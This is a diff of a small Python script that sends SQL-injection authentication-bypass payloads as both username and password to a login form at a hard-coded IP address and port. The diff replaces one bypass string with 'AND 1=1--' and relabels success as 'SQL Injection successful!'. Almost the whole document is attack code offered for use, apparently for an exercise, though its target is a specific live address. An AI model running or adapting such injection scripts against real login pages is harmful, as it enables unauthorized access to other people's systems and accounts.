@@ -4,8 +4,10 @@ import requests
 url = 'http://140.115.59.7:12005/'  # Replace 'your_website_url_here' with the actual URL
 
 # Set your username and password
-username = ' "’ OR ‘’=‘’-- "'
-password = ' "’ OR ‘’=‘’-- "'
+# username = 'AND 1=1--'
+# password = 'AND 1=1--'
+username = 'AND 1=1--'
+password = 'AND 1=1--'
 
 # Craft the POST request data
 data = {
@@ -23,4 +25,4 @@ if 'alert alert-danger d-flex align-items-center' in response.text:
     print("Login failed: Invalid username or password")
 else:
     # If the login status message is not found, consider the login successful
-    print("Login successful!")
+    print("SQL Injection successful!")
